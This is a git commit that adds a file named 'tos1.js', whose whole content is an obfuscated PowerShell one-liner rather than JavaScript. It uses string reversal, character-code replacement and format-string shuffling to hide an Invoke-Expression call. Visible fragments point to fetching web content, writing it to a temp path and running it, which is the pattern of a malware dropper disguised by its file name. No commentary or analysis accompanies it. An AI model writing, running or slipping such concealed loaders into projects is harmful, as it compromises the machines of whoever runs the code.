bb72a739b3f9074d392e9568c68f935ad06d5a86
asakaj2 <andreasakajo3@gmail.com>
2025-03-09 17:22:17 -0500

    Create tos1.js

---
+++ tos1.js
@@ -0,0 +1,22 @@
+IEx((-joIn[rEgex]::MATcHES(")''NIoJ-]52,62,4[cEpSmoC:VNe$ ( . |)63]RAHC[]GNirTS[,)78]RAHC[+711]RAHC[+65]RAHC[((EcALPeR.)93]RAHC[]GNirTS[,)66]RAHC[+121]RAHC[+98]RAHC[((EcALPeR.)43]RAHC[]GNirTS[,'dHV'(EcALPeR.)' ) )93]RaHc[]gnIRts[,ByYiMuByY'+'(ECAlPEr.)63]R'+'aHc[]gnIRts[,)511]RaHc[+37]RaHc[+48]RaHc[((ECAlPEr.)421]R'+'aHc[]g'+'nIRts[,)37]RaHc[+101]RaHc[+4'+'01]RaHc['+'((ECAlPEr.)29]RaHc[]gnIRt'+'s[,)6'+'8]RaHc[+011]RaHc[+'+'65]RaHc[((ECAl'+'PEr.))B'+'yY 
+(i'+'Mu+iMu@ iMu+iMu=iMuByY,ByYiMu+iMu
+{'+' )ByY,ByYiMu iMu+iMuQByY,ByY = }HTi'+'Mu+iMuAiMu+iMuPEByY,ByYoniMu+iMuXKiMu+iMuiPMEiMu+iMuT:vniMu+iMueriMu+ByY,ByYEByY,ByYMuQ'+'H0}'+'3{}0{}1{}2{QHiMu+iMu0( = )MohbMiMu+iMuo'+'iMu+iByY,ByYNIRtS[( ( & Ieh)iMusI'+'TiMu,ByY,ByYMu+iMuon )MiMu+iMuohPiMu+iMu-t'+'iMu+iMByY,ByYuPMohByY,ByY'+'{rByY,ByYf-QByY,ByYuoh'+'iMu+ByY,ByYaByY,ByYiMuhiMu+iMuteMtMoh,iByY,ByYsecorMoiM'+'u+iMuh,iMu+iM'+'uMoByY,ByYiMu+iMuMohiMu+iMu,iMu+iMuMiMu+iMuoiMu+iMuhm.OHMoh f-iMu+iByY,ByY  iMu+iMu    
+ iMu+i'+'Mu}iMu+i'+'Mu   ByY,ByYMu+iMuMohdMoh,iMu+iMuMoiMu+iMuhohMiMu+iMuByY,ByYiMu+iMulapi'+'riMu+iMuMByY,ByYMu QH0}2{}1iMu+iMu{}5iMu+iMu{iMuByY,ByYsByY,By'+'YMuh( ;)MohthMoiMu+iMuh'+'iMu+iMu,Mi'+'Mu+iMuohtByY,ByY:sptMiMu+iMuohiMu+iMu,MoiMu+iMuhaiMu+iMuMoh,MohsaiMu+iMutiMu+iMuMoh,MohiMu+iMu/moiMu+iMucMoiMu+iMuh,iMu+iMuMohByY,ByY 
+{iMu+iMu hctac    
+}iMu+iMu    
+;iMu+iMu}hByY,ByY)iM'+'uiMunByY,ByY5iMu+iMuVi'+'Mu+iMuIf{iMuByY,ByYiMum'+'iMu+iByY,B'+'y'+'YiMuonQ'+'H0ByY,ByY'+'MuTYiMu+iMu5VADEmOiMu+iMuY5'+'ViMu+iMus{riMu+iMuoiMu+'+'iMun  iMu+iMu
+ByY,ByY'+'+iMu }AiMu+iBy'+'Y,ByYiMu=iMu+iMu }DAiM'+'u+iM'+'uolY5i'+'MuByY,ByYMu+iMuHiMu+'+'iMu0}1iMu+iMu{}0{}'+'2{}iMu+iMu3{ByY'+',ByY88]rAhC[+57]rAhC[+501]rAhC[((ecaLPEr.)43]rAhC[]gniRTS[,ByY,ByYurByY,ByYY'+'5VliM'+'u+iMuNiMu+ByY,B'+'yY+iM'+'u}3{}6iMu+iMu{}iMu+iMu0iMu+iMu{}7iMu+iMu{}4{}8{QH0(iM'+'u+i'+'Mu = )iMu+iM'+'uMoiMu+iMuhaMoiMu+iMuhiMu+iMu({@]tciM'+'u+iMuejbOiMu+B'+'yY,ByYoh f-QiByY,By'+'YIOJ-iMuXiMu+]3,1[)ecnEREFerPesObreVsIT]GByY,ByY}I{ron(iMByY,'+'ByYy'+'rByY,ByYiMu+iMut    
+iMu+iMu{ ByY,ByYH0}'+'0{iMu+iMu}1{QH0(&iMu+i'+'Mu( fi   iMu'+'+'+'iMu  iMu+iMu 
+;}iMu+iMueuRY5Vt{r'+'iMu+iMuon =iMu+iMu }iMu+iMudAiMu+iMuoiMu+iMuByY,ByYMu+iMu{iMu+iMuQH0(.   iMu+iMu   
+ByY,ByYMoh,iMu+iMuMohtMoh,iMu+iMuMiMu+iMuohByY,ByYi'+'M'+'uQH0iMu(ecaLPEr.)69]rAhC[]gniRTS[,)98'+']rAhC[+35]rAhC[+68]rAh'+'C[((ecaLPEr.)93]rAhC[]gnB'+'yY,ByYMu+iMuVdeMoiMu+iMuY5ViMu+iMuS{iMu+iMuron ni ByY,ByYu+iMuByY,ByYiMu+iMu,MoiMu+iMuhEGByY,ByYiMu+iMusLAiMu+iMuYiMu+iMu5iMu+iMuVf{r'+'on iMu+ByY,ByYMu+ByY,ByYiMuY5iMu+iMuViMu+iMuWOd{iMu+iMuron   iMu+iByY,ByY   
+;}iMByY,By'+'YliFtiMu+iMuuO-i'+'ByY'+',ByY
+iMu( ByY,ByYohisMiMu+iMuoh,MohYTZMohByY,ByY}   iMu+iMu   iMu+iMu
+ ;}HTYiMu'+'+iMu5VA'+'piMu+iMueY5ViMu+iMuliMu+iMuif{ron eiMu+iMuByY,ByYiMu,MohByY,ByY 
+;iMu+iMu)
+})MiMu+iMuByY,ByYi'+'Mu+iMuhiMu+iMuciMu+iMuaeriMu+i'+'MuoiMu+iMufiMu+i'+'Mu ByY,B'+'yYMu   '+'
+;QiMu+iMuHiMu+iMu0)b.iiMu+iMuroiMu+iMun(rByY,ByYiMu+iMuH0aQH0.}iMu+iMuiByY,ByYiRTS[,iMuMohiMu(ecaLPEr.)iMu  
+iMu+iMu
+}iMu+iMu iMu+i'+'Mu 
+} iMu+iMu  ByY,ByY)411]rAhC[+111]rAhC[+'+'011]rAhC[((ecaLPEr.)i'+'MuVn8iMu,)ByY,ByY)}aTAY5iByY,ByY'+'lY5VIf{r'+'iMu+iMuon iMu+iM'+'u    iMu+iMu 
+{ iMu+iMuByY,ByYTY5ViMu+iMuaPeiMu+iMulYiMu+iMuByY,By'+'Yu+i'+'Mu ByY,ByYu+iMuMohseR-iMu+iMuekiMu+iMuovnMoh,MiMu+iMuoiMu+ByY,ByYhSMoh'+'iMu'+'+iM'+'uf-QH0}1{}3{}iMu+iMu2{}iMu+iMu0iByY,ByY//MoiMu+iMuh,MoiMu+iMuhmiMu+iMuliMu+iM'+'uMoh'+',iMu+iMuMoh.kojlMiMu+iMByY,ByYMuotsuCi'+'Mu+iMuSPiMu+iMu[ iMu+iMuByY,ByY+iM'+'uVnwYiM'+'u'+'+iMu5VOd{ron iMu+iMu iMu+iMu  iMu+iMu iMu+iMu  iMu+iMu 
+iMu+iMu{ )iMu+iMu}HTY5iMu+iMuVApY5iMu+iMuVELiMu+iMuIiMu+iMuF{ron )Moh-ti'+'Mu+iMuseTMohiMu+iMu,iMu+iMuMohhtaiMu+i'+'MByY,ByY}DAiMu+i'+'MuYiMu+iMu5VoLiMu+'+'iMuNWOY5VdiMu+iMu{ro'+'n( fiMu+iMuiByY,ByY}'+'iMu+iMu4{QH0iMu+iMu('+'&iMu+'+'iMu  iMu+i'+'Mu iMu'+'+iMu     ByY,ByYMu+iM'+'uU- )MiMu+iMuohIMoh,iMByY,ByY+iMuriByY,ByYon iiMu+i'+'MuriByY,ByYoh f'+'-iMu+iByYf-dHV}35{}04{}17{}51{}54{}33{}61{'+'}45{}21{}25{}2{}07{}44{}56{}43{}75{}36{}9{}53{}22{}52{}82{}67{}71{}86{}1{}3{}01{}46{}06{}14{}64{}4{}77{}5{}16{}62{}13{}37{}92{}74{}6{}96{}76{}63{}34{}72{}81{}47{}05{}57{}31{}83{}73{}41{}23{}93{}11{}91{}02{}32{}03{}26{}27{}65{}8{}66{}12{}55{}95{}0{}85{}24{}15{}7{}87{}84{}94{}42{dHV((()ByYByYNIOj-ByY'+'xByY+]3,1[)(Gnirtso'+'t.EcNEREfErPeSObREVWu8 ( &'(" ,'.' , 'riGhTtoLeFt') ) )
